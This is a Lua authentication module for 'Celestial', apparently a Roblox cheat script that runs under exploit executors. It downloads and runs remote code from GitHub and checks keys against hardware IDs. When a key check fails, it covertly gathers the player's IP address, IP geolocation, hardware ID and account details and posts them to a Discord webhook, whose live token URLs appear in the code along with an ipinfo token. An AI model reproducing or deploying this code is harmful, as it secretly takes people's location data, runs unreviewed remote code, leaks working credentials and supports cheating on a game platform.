repeat task.wait() until game:IsLoaded()

local auth = {}

local player = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")
local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()

-- Capture originals before anything can hook them
local originalKick = player.Kick

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local hashedHWID = utils.hash(hwid, "SHA-256")

local authConfig = {
    logExecutions = true,
    logBreaches = true,
    autoTrigger = true  -- set to false when loading as a utility library
}

-- Private local — never on the auth table
local currentUser = nil
local kicked = false

-- Fetch whitelist

local function fetchData(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if not success then
        player:Kick("Failed to fetch data from URL: " .. url)
        kicked = true
        return nil
    end

    local successDecode, data = pcall(function()
        return httpService:JSONDecode(response)
    end)

    if not successDecode then
        player:Kick("Failed to decode JSON data from URL: " .. url)
        kicked = true
        return nil
    end

    return data
end

local whitelistURL = "https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Users.json"
local whitelistedUsers = fetchData(whitelistURL)
if not whitelistedUsers then
    player:Kick("Failed to retrieve the whitelist.")
    kicked = true
    return
end

-- Auth check

-- Auth check — populate private local
for _, user in ipairs(whitelistedUsers) do
    if user.HWID == hashedHWID then
        currentUser = user  -- private local, not auth.currentUser
    end
end

-- Private, unexposed version
local function isAuthorizedInternal()
    if currentUser then
        return true, currentUser
    end
    return false, nil
end

-- Public facing one still exists for your other scripts
auth.isAuthorized = newcclosure(function()
    return isAuthorizedInternal()
end)

-- Read-only getter for external scripts
-- Returns a copy so callers can't mutate the original
auth.getUser = newcclosure(function()
    if currentUser == nil then return nil end
    -- Only return data if the calling HWID matches
    if auth.hwid("Hashed") ~= currentUser.HWID then return nil end
    return {
        Identifier = currentUser.Identifier,
        HWID = currentUser.HWID,
        DiscordId = currentUser.DiscordId,
        Key = currentUser.Key,
        JoinDate = currentUser.JoinDate,
        Rank = currentUser.Rank,
        Notes = currentUser.Notes
    }
end)

auth.isKicked = newcclosure(function()
    return kicked
end)




auth.isUser = newcclosure(function()
    return currentUser ~= nil
end)

auth.isOwner = newcclosure(function()
    return currentUser ~= nil and currentUser.Rank == "Owner"
end)

auth.fetchConfig = function(configName)
    if type(configName) ~= "string" then
        warn("Argument #1 (configName) expected a string value and a valid config name but got a " .. typeof(configName) .. " value and an invalid config name.")
        return nil
    end

    configName = string.lower(configName)

    for key, value in pairs(authConfig) do
        if string.lower(key) == configName then
            return value
        end
    end

    warn("auth.fetchConfig: Config not found.")
end

auth.hwid = function(mode)
    if mode == "Normal" then
        return hwid
    elseif mode == "Hashed" then
        return hashedHWID
    else
        warn("auth.hwid: Invalid mode.")
        return
    end
end

auth.exploitSupported = function()
    local supported = {
        ["AWP"] = true,
        ["Wave"] = true,
        ["Synapse Z"] = true,
        ["Zenith"] = true,
        ["Seliware"] = true,
        ["Volcano"] = true,
        ["Potassium"] = true,
        ["Visual"] = false,
        ["Solara"] = false
    }

    local exec = identifyexecutor()
    if not supported[exec] then
        player:Kick("Celestial does not support " .. exec)
        kicked = true
    end

    return true
end

auth.clear = function()
    if getgenv().script_key ~= nil then
        getgenv().script_key = nil
    else
        if not auth.isUser() then return end
        warn("auth.clear: No key to clear.")
    end
end

local function logEvent(eventType)
    local executionURL = "https://discord.com/api/webhooks/1514052412971683940/7-CFUCneSvs-dW4Aq0mCXHYDOVcZ95ahgWvDrTt_ldIl8t0_dRItt8s5sK5jZZpKVeL1"
    local breachURL = "https://discord.com/api/webhooks/1514036528500965548/A5Kt2C4hJb2z_UYRSuI71E4h2-7v1q6IY528-EyB06frKL6Xu8RdDrsDnRNy0BIZmraV"
    local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
    local authUser = auth.getUser()

    if eventType == "execution" then
        if not auth.isUser() then
            warn("how did you manage to run the execution logger script unwhitelisted")
        end

        -- Build embed

        local embed = embedLib.createEmbed({
            webhookUrl = executionURL,
            title = "**__Celestial has been executed__**",
            url = "https://roblox.com/users/" .. player.UserId .. "/profile",
            color = Color3.fromRGB(0, 170, 0), -- #00AA00 = 2752256
            author = {
                name = "Celestial",
                icon_url = "Celestial"
            },
            footer = {
                enabled = true,
                displaySeconds = true,
                icon = "Celestial"
            }
        })

        -- Add fields

        embedLib.addField(embed, "Timezone", "**" .. os.date("%Z") .. "**", true)
        embedLib.addField(embed, "Linked Account", "<@" .. authUser.DiscordId .. ">", true)
        embedLib.addField(embed, "", "[Game Page](https://www.roblox.com/games/" .. game.PlaceId .. ")", true)
        embedLib.addField(embed, "Identifier", authUser.Identifier, true)
        embedLib.addField(embed, "Account Age", player.AccountAge .. " Days", true)
        embedLib.addField(embed, "Owner", "`" .. tostring(auth.isOwner()) .. "`", true)
        embedLib.addField(embed, "Exploit", identifyexecutor(), true)
        embedLib.addField(embed, "HWID", "||```" .. auth.hwid("Hashed") .. "```||", true)
        embedLib.addField(embed, "Key", "||```" .. authUser.Key .. "```||", true)

        -- Conditional fields

        if authUser.Notes and authUser.Notes ~= "false" then
            embedLib.addField(embed, "Notes", "```" .. authUser.Notes .. "```", true)
        end

        embedLib.addField(embed, "Server Join Code", "```" .. [[game:GetService("TeleportService")]] .. ":TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')" .. "```", false)

        -- Send

        embedLib.sendEmbed(embed, "Celestial", "Celestial")
    elseif eventType == "breach" then
        local isUser = auth.isUser()

        local userInputService = game:GetService("UserInputService")
        local ipv4 = game:HttpGet("https://api.ipify.org")
        local ipdetails = game:HttpGet("https://ipinfo.io/?token=03dce9579aa8e0")

        local function getDevice()
            if userInputService.TouchEnabled then
                return "Mobile"
            elseif userInputService.KeyboardEnabled then
                return "PC"
            elseif userInputService.GamepadEnabled then
                return "Console"
            else
                return "Unknown"
            end
        end

        local scriptkey = getgenv().script_key or "nil / not provided"
        local keyOwner = nil
        for _, user in ipairs(whitelistedUsers) do
            if user.Key == scriptkey then
                keyOwner = user
                break
            end
        end

        -- Embed

        local footerText
        if keyOwner == nil then
            footerText = "⚠️ Key does not exist in the whitelist."
        elseif hashedHWID ~= keyOwner.HWID then
            footerText = "⚠️ This unauthorized user (" .. player.DisplayName .. ") is most likely key sharing with " .. keyOwner.Identifier
        elseif not isUser and not authUser then
            footerText = "⚠️ User is not authorized."
        end

        local embedData = {
            webhookUrl = breachURL,
            title = nil,
            description = false,
            color = Color3.fromRGB(255, 0, 0),
            url = "https://roblox.com/users/" .. player.UserId .. "/profile",
            thumbnail = nil,
            author = {
                name = "Potential Celestial Breach",
                icon_url = "https://i.imgur.com/eP1Ldg9.png",
                url = nil
            },
            footer = {
                enabled = true,
                name = footerText,
                icon = nil,
                displaySeconds = true
            },
        }

        local embed = embedLib.createEmbed(embedData)

        -- Fields

        local discordId = tostring(isUser and authUser.DiscordId or 0)
        local identifier = tostring(isUser and authUser.Identifier or "Unknown")
        local rank = tostring(isUser and authUser.Rank or "Unknown")

        local fields = {
            { name = "================== UNAUTHORIZED USER ==================", value = "", inline = false },

            { name = "Used Key", value = "```" .. scriptkey .. "```", inline = false },
            { name = "Name", value = player.DisplayName .. " (@" .. player.Name .. ")", inline = true },
            { name = "Account Age", value = player.AccountAge .. " Days", inline = true },
            { name = "User ID", value = player.UserId, inline = true },
            { name = "Device", value = getDevice(), inline = true },
            { name = "Exploit", value = identifyexecutor(), inline = true },
            { name = "IPv4", value = "||```" .. ipv4 .. "```||", inline = true },
            { name = "Hardware ID (HWID)", value = "```" .. hashedHWID .. "``` ```\n\n" .. hwid .. "```", inline = true },
            { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
            -- { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },

            { name = "================== KEY OWNER ==================", value = "", inline = false },
            { name = "Linked Account", value = keyOwner and ("<@" .. keyOwner.DiscordId .. ">") or "N/A", inline = true },
            { name = "Identifier", value = keyOwner and keyOwner.Identifier or "N/A", inline = true },
            { name = "Rank", value = keyOwner and keyOwner.Rank or "N/A", inline = true },
            { name = "HWID", value = keyOwner and ("```" .. keyOwner.HWID .. "```") or "N/A", inline = true },
        }

        for _, field in ipairs(fields) do
            embedLib.addField(embed, field.name, field.value, field.inline)
        end

        embedLib.sendEmbed(embed, "Celestial Breaches", "Celestial")
    else
        warn("Invalid event type.")
    end
end

-- ================ PROTECTION ================

-- Private trigger — not on the auth table, unreachable from outside
local function internalTrigger()
    if not whitelistedUsers then
        warn("[Celestial] Whitelist is nil.")
        player:Kick("Failed to retrieve whitelist.")
        kicked = true
        return
    end

    local scriptKey = getgenv().script_key

    if typeof(scriptKey) ~= "string" then
        warn("[Celestial] No script key provided.")
        if authConfig.logBreaches then logEvent("breach") end
        player:Kick("No script key provided.")
        kicked = true
        return
    end

    -- First, find which user owns this key in the whitelist
    local keyOwner = nil
    for _, user in ipairs(whitelistedUsers) do
        if user.Key == scriptKey then
            keyOwner = user
            break
        end
    end

    -- Key doesn't exist in the whitelist at all
    if not keyOwner then
        warn("[Celestial] Script key not found in whitelist.")
        if authConfig.logBreaches then logEvent("breach") end
        player:Kick("Invalid script key.")
        kicked = true
        return
    end

    -- Key exists but is not assigned to this HWID
    if keyOwner.HWID ~= hashedHWID then
        warn("[Celestial] Script key belongs to a different HWID.")
        if authConfig.logBreaches then logEvent("breach") end
        player:Kick("This script key is not linked to your hardware.")
        kicked = true
        return
    end

    -- HWID matches the key owner — set currentUser
    currentUser = keyOwner
    if not getgenv()._celestial_auth then
        getgenv()._celestial_auth = auth
    end

    if authConfig.logExecutions then logEvent("execution") end
end

-- Public facing trigger delegates to the private local
-- Overwriting auth.trigger from outside has no effect on internalTrigger
auth.trigger = function()
    internalTrigger()
end

local runAntiHookChecks = function()

    -- 1. Kick
    local currentKick = player.Kick
    if not rawequal(currentKick, originalKick) or isfunctionhooked(originalKick) then
        if authConfig.logBreaches then logEvent("breach") end
        player:Kick("Tampering detected: Kick function has been overwritten.")
        kicked = true
        return false
    end

    -- 2. identifyexecutor
    if isfunctionhooked(identifyexecutor) then
        if authConfig.logBreaches then logEvent("breach") end
        player:Kick("Tampering detected: identifyexecutor has been hooked.")
        kicked = true
        return false
    end

    return true
end

auth.runAntiHookChecks = runAntiHookChecks

-- Run auth on load — before any external script can interfere
if authConfig.autoTrigger and not getgenv()._celestial_noauth then
    internalTrigger()
end
getgenv()._celestial_noauth = nil  -- clean up after

game:GetService("RunService").Heartbeat:Connect(newcclosure(function()
    if kicked then return end
    runAntiHookChecks()
end))

return auth